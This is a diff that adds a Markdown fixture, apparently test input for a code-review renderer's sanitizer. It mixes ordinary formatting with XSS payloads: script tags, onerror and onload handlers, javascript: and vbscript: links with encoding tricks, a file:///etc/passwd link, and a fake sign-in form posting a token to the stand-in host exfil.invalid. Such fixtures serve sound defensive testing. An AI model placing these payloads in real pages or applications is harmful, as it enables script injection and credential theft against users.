@@ -1,0 +1,54 @@
+# Review notes
+
+A paragraph with **strong**, *emphasis*, ~~obsolete~~, and `a < b && c > d`. A soft
+line break stays in the same paragraph.
+
+A second paragraph with [documentation](https://example.invalid/docs?q=one&next=two "Docs"), <https://example.invalid/auto>, and [email](mailto:review@example.invalid).
+
+## Nested changes
+
+1. First change
+   - Nested detail
+     - Deep **detail**
+   - Another detail
+2. Second change
+
+> A quoted **review**.
+>
+> Another quoted paragraph.
+
+- [x] Tests complete
+- [ ] Publish only after review
+
+| File | Result | Explanation |
+| :--- | :---: | ---: |
+| `src/calc.go:2` | **pass** | extraordinarily_long_unbroken_cell_content_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvwxyz |
+| src/calc.go:3 | pending | A second row |
+
+```html
+<script>window.__markdownXss = 'fenced';</script>
+<img src="https://exfil.invalid/fenced" onerror="window.__markdownXss = 'fenced-image'">
+const significant = "< > & \" '";
+const longLine = "abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvwxyz";
+```
+
+Open `src/calc.go:2`, [the changed line](src/calc.go:3), or src/calc.go. Unknown `secret.env:1` and invalid `src/calc.go:0`, `src/calc.go:-1`, `src/calc.go:9007199254740992` stay inert.
+
+![Remote diagram](https://exfil.invalid/image?private=source)
+
+![Unsafe image](data:image/svg+xml;base64,PHN2Zz4=)
+
+[unsafe-js](javascript:alert%281%29) [encoded-js](javascript&#58;alert%281%29) [percent-js](javascript%3Aalert%281%29) [mixed-js](JaVaScRiPt:alert%281%29) [tab-js](java&#x09;script:alert%281%29)
+
+[unsafe-vb](vbscript:msgbox%281%29) [unsafe-data](data:text/html,attack) [unsafe-file](file:///etc/passwd) [relative](../private) [protocol-relative](//exfil.invalid/private)
+
+<script>window.__markdownXss = 'raw';</script>
+<img src="https://exfil.invalid/raw" onerror="window.__markdownXss = 'image'">
+<SvG onload="window.__markdownXss = 'svg'"><script>window.__markdownXss = 'nested';</script></SvG>
+<form action="https://exfil.invalid/auth"><input type="password" name="token"><button>Sign in</button></form>
+<iframe src="https://exfil.invalid/frame"></iframe><object data="https://exfil.invalid/object"></object><style>body{display:none}</style>
+<a href="#skim-file-0" data-file-ref="0" onclick="window.__markdownXss = 'forged'">forged navigation</a>
+
+---
+
+Escaped \*literal asterisks\*, &amp; entity, and <not-a-real-tag> literal HTML.
